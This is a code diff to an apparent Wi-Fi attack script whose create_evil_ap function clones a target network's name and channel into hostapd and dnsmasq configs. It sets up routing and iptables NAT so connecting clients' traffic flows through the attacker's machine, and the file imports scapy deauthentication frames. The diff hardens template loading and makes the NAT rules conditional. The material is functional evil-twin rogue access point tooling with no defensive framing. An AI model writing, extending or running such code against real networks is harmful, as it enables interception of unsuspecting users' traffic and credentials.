@@ -1,4 +1,4 @@
-import subprocess, time
+import subprocess, time, shutil
 from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11AssoReq
 from threading import Thread, Event
 import os
@@ -9,6 +9,12 @@ from pathlib import Path
 # Event to stop deauth thread
 _deauth_stop = Event()
 
+def interface_exists(iface):
+    return shutil.which("ip") and subprocess.run(
+        ["ip","link","show",iface],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    ).returncode == 0
 
 def create_evil_ap(ap_info, ap_iface, uplink_iface="eth0", output_dir="."):
     """
@@ -22,8 +28,30 @@ def create_evil_ap(ap_info, ap_iface, uplink_iface="eth0", output_dir="."):
     channel = ap_info['Channel']
 
     # 1) Load templates (in cwd)
-    hostapd_tmpl = Path("template_hostapd.conf").read_text()
-    dnsmasq_tmpl = Path("template_dnsmasq.conf").read_text()
+    BASE_DIR = Path(__file__).parent
+    print(f"  → Looking in {BASE_DIR} for templates…")
+
+    hostapd_path = BASE_DIR / "template_hostapd.conf"
+    dnsmasq_path = BASE_DIR / "template_dnsmasq.conf"
+
+    print(f"    hostapd template: {hostapd_path}  exists? {hostapd_path.exists()}")
+    print(f"    dnsmasq template: {dnsmasq_path}  exists? {dnsmasq_path.exists()}")
+
+    try:
+        hostapd_tmpl = hostapd_path.read_text()
+        print("    • hostapd template loaded OK")
+    except Exception as e:
+        print(f"ERROR loading hostapd template: {e}")
+        return
+
+    try:
+        dnsmasq_tmpl = dnsmasq_path.read_text()
+        print("    • dnsmasq template loaded OK")
+    except Exception as e:
+        print(f"ERROR loading dnsmasq template: {e}")
+        return
+
+    print("Loaded hostapd and dnsmasq templates.")
 
     # 2) Replace our placeholders
     hostapd_conf = (
@@ -32,7 +60,7 @@ def create_evil_ap(ap_info, ap_iface, uplink_iface="eth0", output_dir="."):
         .replace("[WIFI NAME]", ssid)
         .replace("[CHANNEL NAME]", str(channel))
     )
-
+    print("Replaced placeholders in hostapd template.")
     dnsmasq_conf = dnsmasq_tmpl.replace("[INTERFACE NAME]", ap_iface)
 
     # 3) Write out the real configs
@@ -43,23 +71,19 @@ def create_evil_ap(ap_info, ap_iface, uplink_iface="eth0", output_dir="."):
     print(f"Written {out_dir/'hostapd.conf'} and {out_dir/'dnsmasq.conf'}")
 
     cmds = [
-        # 4) Routing Table & Gateway
-        # assigns IP .1 to the monitor interface 
         ["ifconfig", ap_iface, "up", "192.168.1.1", "netmask", "255.255.255.0"],
-        # ensures traffic for 192.168.1.x goes via .1
         ["route", "add", "-net", "192.168.1.0", "netmask", "255.255.255.0", "gw", "192.168.1.1"],
-
-        # 5) Enabling Internet Access (NAT)
-        # NAT: masquerade outgoing traffic on eth0
-        ["iptables", "--table", "nat", "--append", "POSTROUTING",
-         "--out-interface", uplink_iface, "-j", "MASQUERADE"],
-        # allow forwarding from Wi‑Fi to Ethernet
-        ["iptables", "--append", "FORWARD",
-         "--in-interface", ap_iface, "-j", "ACCEPT"],
-
-        # enable IPv4 packet forwarding
-        ["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
     ]
+
+    # Only add NAT if uplink_iface actually exists
+    if interface_exists(uplink_iface):
+        cmds += [
+            ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", uplink_iface, "-j", "MASQUERADE"],
+            ["iptables", "-A", "FORWARD", "-i", ap_iface, "-j", "ACCEPT"],
+            ["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
+        ]
+    else:
+        print(f"[!] Uplink interface '{uplink_iface}' not found—skipping NAT rules.")
 
     for cmd in cmds:
         print("Running:", " ".join(cmd))
